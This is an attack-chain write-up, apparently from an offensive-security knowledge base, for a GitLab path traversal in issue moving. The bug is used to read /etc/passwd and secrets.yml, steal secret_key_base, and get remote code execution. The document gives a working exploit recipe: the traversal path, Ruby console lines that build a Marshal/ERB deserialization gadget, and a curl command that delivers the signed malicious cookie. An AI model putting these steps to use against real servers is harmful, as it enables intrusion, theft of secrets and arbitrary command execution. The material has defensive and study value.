---
tags:
  - gitlab
  - path-traversal
  - arbitrary-file-read
  - rce
  - deserialization
type: attack_chain
tools:
  - '[[tools/Rails-Console]]'
  - '[[tools/curl]]'
  - '[[tools/cat]]'
tactics:
  - '[[Initial Access]]'
  - '[[Execution]]'
  - '[[Persistence]]'
  - '[[Discovery]]'
commands:
  - '[[commands/rails-request-setup]]'
  - '[[commands/rails-set-serializer]]'
  - '[[commands/rails-cookie-jar]]'
  - '[[commands/rails-erb-payload]]'
  - '[[commands/rails-deprecated-proxy]]'
  - '[[commands/rails-set-signed-cookie]]'
  - '[[commands/rails-print-cookie]]'
  - '[[commands/curl-send-malicious-cookie]]'
  - '[[commands/cat-verify-file]]'
platforms:
  - Web
  - Linux
complexity: high
procedures:
  - '[[procedures/Setup-GitLab-Projects-and-Path-Traversal-Issue]]'
  - '[[procedures/Trigger-Arbitrary-File-Read-by-Moving-Issue]]'
  - '[[procedures/Extract-Secret-Key-Base]]'
  - '[[procedures/Generate-and-Deliver-Deserialization-Payload-for-RCE]]'
step_count: 4
techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Command-Line Interface]]'
  - '[[Use Alternate Authentication Material]]'
description: >-
  Exploitation chain starting with path traversal in GitLab's issue moving
  feature to read arbitrary files, escalating to remote code execution via
  insecure cookie deserialization using stolen secrets.
skill_level: advanced
impact_level: high
id: 7e8f9e66-87aa-4978-a252-5b6213760ba0
created_at: '2025-12-11T06:10:40.448Z'
updated_at: '2025-12-11T06:10:40.448Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[TA0001]]'
  - '[[TA0002]]'
  - '[[TA0003]]'
  - '[[TA0007]]'
mitre_techniques:
  - '[[T1190]]'
  - '[[T1059]]'
  - '[[T1550]]'
---
# GitLab Path Traversal Arbitrary File Read to RCE via Insecure Deserialization

Multi-stage attack chain exploiting a path traversal vulnerability in GitLab's UploadsRewriter during issue movement to read arbitrary files, then using the stolen secret_key_base to craft a malicious serialized cookie for remote code execution.

## Chain Metrics Dashboard

| Metric | Value |
|--------|-------|
| Chain Status | Unverified |
| Total Steps | 4 |
| Execution Time | ~15 minutes |
| Skill Level | Advanced |
| Complexity | High |
| Impact Level | High |

## Attack Flow Visualization

```mermaid
graph LR
    A[Initial Setup] --> B[File Read Exploit]
    B --> C[Secret Extraction]
    C --> D[RCE Execution]

    style A fill:#e74c3c
    style B fill:#f39c12
    style C fill:#3498db
    style D fill:#27ae60
```

## Prerequisites & Requirements

### Required Tools

- [[tools/Rails-Console]]
- [[tools/curl]]
- [[tools/cat]]

### Target Environment

- GitLab instance on Linux
- Required services: PostgreSQL 10.12, Redis 5.0.7, GitLab Shell 11.0.0
- Tech stack: Ruby on Rails, Ruby 2.6.5, etc.

### Initial Access Requirements

- Access to create and move issues in GitLab projects
- Ability to send HTTP requests to the GitLab server

## Detailed Attack Procedures

### Step 1: Project Setup and Path Traversal Payload - [[procedures/Setup-GitLab-Projects-and-Path-Traversal-Issue]]

**Objective**: Create source and destination projects and add an issue with a path traversal payload in Markdown to prepare for arbitrary file copying.

**Expected Output**: Projects created and issue posted with traversal reference.

**Success Indicators**:
- Source and destination projects exist
- Issue description includes Markdown with traversal path like /uploads/11111111111111111111111111111111/../../../../../../../../../../../../../../etc/passwd

Follow the procedure [[procedures/Setup-GitLab-Projects-and-Path-Traversal-Issue]] for detailed steps.

### Step 2: Trigger File Copy via Issue Move - [[procedures/Trigger-Arbitrary-File-Read-by-Moving-Issue]]

**Objective**: Move the issue to the destination project, triggering the UploadsRewriter to copy the arbitrary file without validation.

**Expected Output**: Targeted file (e.g., /etc/passwd) copied to the new project's uploads directory.

**Success Indicators**:
- Issue successfully moved
- File accessible in the new project's context

Follow the procedure [[procedures/Trigger-Arbitrary-File-Read-by-Moving-Issue]] for detailed steps.

### Step 3: Extract Secret Key Base - [[procedures/Extract-Secret-Key-Base]]

**Objective**: Use the file read vulnerability to obtain the secret_key_base from secrets.yml for payload signing.

**Expected Output**: Contents of /opt/gitlab/embedded/service/gitlab-rails/config/secrets.yml retrieved.

**Success Indicators**:
- Secret key value extracted and noted

Follow the procedure [[procedures/Extract-Secret-Key-Base]] for detailed steps.

### Step 4: Generate and Send RCE Payload - [[procedures/Generate-and-Deliver-Deserialization-Payload-for-RCE]]

**Objective**: Craft a malicious serialized cookie using the stolen secret, send it via curl to trigger deserialization and execute arbitrary commands, then verify.

**Expected Output**: Command executed on server, e.g., file written to /tmp/vakzz.

**Success Indicators**:
- HTTP request succeeds with payload
- Verification command shows expected output like 'vakzz was here'

Use [[tools/Rails-Console]] to generate the payload:

```ruby
request = ActionDispatch::Request.new(Rails.application.env_config)
```

```ruby
request.env["action_dispatch.cookies_serializer"]=:marshal
```

```ruby
cookies = request.cookie_jar
```

```ruby
erb =ERB.new("<%= `echo vakzz was here > /tmp/vakzz` %>")
```

```ruby
depr = ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy.new(erb,:result,"@result", ActiveSupport::Deprecation.new)
```

```ruby
cookies.signed[:cookie]= depr
```

```ruby
puts cookies[:cookie]
```

Then send with [[commands/curl-send-malicious-cookie]]:

```bash
curl -vvv 'http://gitlab-vm.local/users/sign_in' -b "experimentation_subject_id=BAhvOkBBY3RpdmVTdXBwb3J0OjpEZXByZWNhdGlvbjo6RGVwcmVjYXRlZEluc3RhbmNlVmFyaWFibGVQcm94eQk6DkBpbnN0YW5jZW86CEVSQgs6EEBzYWZlX2xldmVsMDoJQHNyY0kiYiNjb2Rpbmc6VVRGLTgKX2VyYm91dCA9ICsnJzsgX2VyYm91dC48PCgoIGBlY2hvIHZha3p6IHdhcyBoZXJlID4gL3RtcC92YWt6emAgKS50b19zKTsgX2VyYm91dAY6BkVGOg5AZW5jb2RpbmdJdToNRW5jb2RpbmcKVVRGLTgGOwpGOhNAZnJvemVuX3N0cmluZzA6DkBmaWxlbmFtZTA6DEBsaW5lbm9pADoMQG1ldGhvZDoLcmVzdWx0OhBAZGVwcmVjYXRvckl1Oh9BY3RpdmVTdXBwb3J0OjpEZXByZWNhdGlvbgAGOwpUOglAdmFySSIMQHJlc3VsdAY7ClQ=--ef9c244a1f6b4724c1d3cbf045f8ee28a42d4b06"
```

Verify with [[commands/cat-verify-file]]:

```bash
cat /tmp/vakzz
```

Follow the procedure [[procedures/Generate-and-Deliver-Deserialization-Payload-for-RCE]] for detailed steps.

## Attack Chain Summary

### Key Achievements

1. Arbitrary file read via path traversal
2. Theft of secret_key_base
3. Successful RCE through cookie deserialization

## Technique & Tactic Coverage

### MITRE ATT&CK Techniques

- [[Exploit Public-Facing Application]]
- [[Command-Line Interface]]
- [[Use Alternate Authentication Material]]

### MITRE ATT&CK Tactics

- [[Initial Access]]
- [[Execution]]
- [[Persistence]]
- [[Discovery]]

*Last updated: 2023-10-01*
